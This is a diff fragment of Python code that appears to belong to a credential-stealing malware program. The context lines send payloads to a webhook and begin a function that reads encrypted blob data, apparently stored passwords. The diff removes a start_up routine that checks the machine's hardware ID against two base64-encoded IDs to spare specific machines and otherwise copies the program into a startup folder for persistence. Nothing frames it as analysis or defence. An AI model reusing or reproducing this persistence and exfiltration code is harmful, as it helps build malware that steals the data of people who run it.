@@ -86,24 +86,6 @@ response = requests.post(webhook, json=payload2)
 response = requests.post(webhook, json=payload3)
 
 
-def start_up():
-    try:
-        hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
-        if hwid == b64decode(b'NUEyNTc2MkEtODlFNi04QTE4LUE1MjMtMDBEODYxQzc0NzU3').decode('UTF-8'):
-            pass
-        if hwid == b64decode(b'Mzg0NDQzMzUtMzgzMi01NzMwLTM1MzktMzk1NzM4MzI0NDM1').decode('UTF-8'):
-            pass
-        else:
-            shutil.copy2(argv[0], startup_loc)
-    except Exception:
-        try:
-            start_up()
-        except Exception:
-            pass
-
-start_up()
-
-
 def GetData(blob_out):
     cbData = int(blob_out.cbData)
     pbData = blob_out.pbData
